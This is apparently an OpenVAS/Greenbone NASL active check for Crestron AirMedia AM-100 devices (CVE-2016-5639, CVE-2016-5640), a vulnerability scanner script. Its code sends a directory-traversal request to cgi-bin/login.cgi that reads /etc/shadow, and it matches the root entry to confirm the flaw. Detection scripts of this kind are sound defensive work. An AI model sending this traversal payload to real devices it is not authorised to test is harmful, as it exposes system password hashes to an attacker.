# Copyright (C) 2016 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE_PREFIX = "cpe:/o:crestron";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106410");
  script_version("2023-01-31T10:08:41+0000");
  script_tag(name:"last_modification", value:"2023-01-31 10:08:41 +0000 (Tue, 31 Jan 2023)");
  script_tag(name:"creation_date", value:"2016-11-23 12:47:24 +0700 (Wed, 23 Nov 2016)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2016-08-15 15:42:00 +0000 (Mon, 15 Aug 2016)");

  script_cve_id("CVE-2016-5639", "CVE-2016-5640");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Crestron AirMedia AM-100 1.1.1.11 - 1.2.1 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_crestron_airmedia_consolidation.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("crestron_airmedia/http/detected");

  script_tag(name:"summary", value:"Crestron AirMedia AM-100 devices are prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Tries to conduct a directory traversal attack via HTTP.");

  script_tag(name:"insight", value:"The following flaws exist:

  - Directory traversal vulnerability in cgi-bin/login.cgi

  - Hidden Management Console with hardcoded default credentials

  - Hardcoded credentials");

  script_tag(name:"impact", value:"An unauthenticated attacker may read arbitrary system files or login
  with hardcoded credentials.");

  script_tag(name:"affected", value:"Crestron AirMedia AM-100 devices with firmware versions
  1.1.1.11 through 1.2.1 are known to be affected. Other devices/models or versions might be
  affected as well.");

  script_tag(name:"solution", value:"Update to version 1.4.0.13 or later.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40813/");
  script_xref(name:"URL", value:"https://github.com/CylanceVulnResearch/disclosures/blob/master/CLVA-2016-05-001.md");
  script_xref(name:"URL", value:"https://github.com/CylanceVulnResearch/disclosures/blob/master/CLVA-2016-05-002.md");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, service: "www"))
  exit(0);

port = infos["port"];
CPE = infos["cpe"];

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

res = http_get_cache(port: port, item: dir + "/cgi-bin/login.cgi?lang=en&src=AwLoginDownload.html");

# nb:
# - Just a cross check because we're launching this against different AM devices
# - This check existed in the initial version of this VT which was "standalone" and only had a
#   dependency to a Lighttpd detection
if ("<title>Crestron AirMedia</title>" >< res && "Device Administration" >< res &&
    "Download AirMedia Utility Software" >< res) {
  url = "/cgi-bin/login.cgi?lang=en&src=../../../../../../../../../../../../../../../../../../../../etc/shadow";
  if (http_vuln_check(port: port, url: url, pattern: "root:.*:0:0:99999:7:::", check_header: TRUE)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }

  exit(99);
}

exit(0);
